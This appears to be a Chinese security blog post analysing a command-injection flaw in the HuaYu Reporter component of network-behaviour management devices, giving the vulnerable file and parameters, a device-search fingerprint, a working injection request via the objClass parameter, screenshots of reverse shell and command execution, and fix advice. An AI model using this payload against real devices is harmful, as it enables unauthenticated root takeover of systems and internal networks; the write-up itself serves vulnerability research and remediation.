# 概述

一个偶然的机会听说华域Reporter组件存在漏洞，团队大佬在GitHub找到了漏洞利用代码：[HuaYuReporterGetShell](https://github.com/Tas9er/HuaYuReporterGetShell
"HuaYuReporterGetShell")。该组件的设备较多，多用于上网行为管理设备的报表系统，该漏洞利用难度低，影响范围较广，无需登录可直接以root权限执行任意命令，从而控制该设备，进而控制内网其它服务器和终端设备，该设备一旦被控制，可能会影响到整个内网。

# 反编译jar

使用jd-gui查看jar包源码发现漏洞所在文件：`/view/Behavior/toQuery.php`，参数和Payload，如图：  
![image](https://image.3001.net/images/20210913/1631516638_613ef7deeadc161689da6.png!small)

# 漏洞分析

查看漏洞文件源码发现toQuery.php文件执行命令的函数exec的参数cmd可控，且未进行过滤等安全防护操作，如图：  
![image](https://image.3001.net/images/20210913/1631516651_613ef7eb0be70b785a0bc.png!small)  
因此在`method`参数值等于`getList`或`import`的情况下，通过`objClass`参数将需要执行的命令拼接到`cmd`参数，在调用`exec`函数时执行`objClass`传入的命令。

# 编写PoC

## 使用Goby

思路：使用echo命令将特定字符串重定向到特定文件，当该文件内容为写入的特定字符串时说明漏洞存在。  
1、查询规则：`title="Login @ Reporter"`  
2、请求一：`/view/Behavior/toQuery.php?method=getList&objClass=%0aecho%20%27f029ff010012ms%27%20>/var/www/reporter/view/Behavior/f029ff010012ms.txt%0a`  
3、请求二：`/view/Behavior/f029ff010012ms.txt`，匹配Body中包含特定字符串：`f029ff010012ms`  
Poc测试结果如图：  
![image](https://image.3001.net/images/20210913/1631516665_613ef7f9931f11f5bd6bd.png!small)  
Exp验证结果如图：  
![image](https://image.3001.net/images/20210913/1631516673_613ef801e35caedb380e4.png!small)

## 使用pocsuite

Poc：  
![image](https://image.3001.net/images/20210913/1631516686_613ef80e60b19c38ee9de.png!small)  
![image](https://image.3001.net/images/20210913/1631516694_613ef816702957166fce4.png!small)  
Poc测试结果如图：  
![image](https://image.3001.net/images/20210913/1631516701_613ef81dc374cf4cf80a8.png!small)  
反弹shell，如图：  
![image](https://image.3001.net/images/20210913/1631516713_613ef8295631955d76159.png!small)  
![image](https://image.3001.net/images/20210913/1631516721_613ef831a8f3b21185db6.png!small)  
![image](https://image.3001.net/images/20210913/1631516731_613ef83b455e666b0ebf1.png!small)  
执行命令如图：  
![image](https://image.3001.net/images/20210913/1631516739_613ef84343cbe40a03feb.png!small)

# 修复建议

1、过滤用户传入的数据  
2、重写代码，创建白名单命令列表，避免使用objClass参数

